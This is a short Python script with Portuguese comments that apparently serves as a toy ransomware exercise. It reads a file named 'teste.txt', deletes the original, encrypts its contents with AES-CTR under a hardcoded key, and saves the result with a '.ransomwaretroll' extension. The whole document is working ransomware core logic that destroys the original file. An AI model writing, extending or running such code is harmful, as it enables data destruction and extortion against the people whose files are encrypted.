import os
import pyaes

# importando nome do arquivo pra dentro de uma variável

file_name = 'teste.txt'

file = open(file_name, "rb") 

file_data = file.read() # recebe o conteúdo dentro do arquivo

file.close() # para a execução

os.remove(file_name)


# chave de criptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)
encrypter_data = aes.encrypt(file_data)

# Criando novo arquivo

newFile = file_name + '.ransomwaretroll'
newFile = open(f'{newFile}', 'wb')
newFile.write(encrypter_data)
newFile.close()
